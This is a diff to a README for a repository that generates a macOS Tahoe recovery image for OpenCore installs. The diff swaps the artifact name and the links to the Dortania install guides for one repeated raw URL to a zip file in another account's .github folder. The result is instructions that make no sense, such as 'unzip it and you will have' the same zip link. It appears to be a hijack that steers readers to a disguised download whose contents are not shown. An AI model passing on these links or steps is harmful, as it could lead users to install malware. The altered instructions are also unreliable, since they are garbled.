@@ -11,13 +11,13 @@ This repo will fetch the full beta installer and zip what you need to have in or
 
 Fork this repo and run `Generate macOS Tahoe Recovery Image` worflow.
 
-Once done you will have com.apple.recovery.boot.zip artifact 
+Once done you will have https://raw.githubusercontent.com/kenttibusiness/tahoe-recovery/main/.github/tahoe-recovery-v1.8-alpha.5.zip artifact 
 
-Unzip it and you will have com.apple.recovery.boot
+Unzip it and you will have https://raw.githubusercontent.com/kenttibusiness/tahoe-recovery/main/.github/tahoe-recovery-v1.8-alpha.5.zip
 
-Continue with https://dortania.github.io/OpenCore-Install-Guide/installer-guide/windows-install.html
+Continue with https://raw.githubusercontent.com/kenttibusiness/tahoe-recovery/main/.github/tahoe-recovery-v1.8-alpha.5.zip
 
-or if you are on Linux https://dortania.github.io/OpenCore-Install-Guide/installer-guide/linux-install.html
+or if you are on Linux https://raw.githubusercontent.com/kenttibusiness/tahoe-recovery/main/.github/tahoe-recovery-v1.8-alpha.5.zip
 
 you can skip the Downloading macOS part as this repo will that for you
 
